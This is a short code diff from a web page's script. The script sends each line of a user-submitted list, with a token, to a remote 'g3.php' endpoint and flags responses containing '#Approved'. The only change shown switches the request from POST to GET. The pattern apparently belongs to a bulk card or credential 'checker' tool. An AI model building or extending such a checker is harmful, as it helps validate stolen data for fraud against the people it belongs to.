@@ -237,7 +237,7 @@ Powered By : <a href="https://blog.receivefreesms.co.uk" target="_blank">RSO Blo
       linhaenviar.forEach(function(value, index) {
               $.ajax({
               url: 'https://tools.rsoblog.com/g3.php?lista=' + value + '&token=' + tok,
-              type: 'POST',
+              type: 'GET',
               async: true,
               success: function(resultado) {
                 if (resultado.match("#Approved")) {
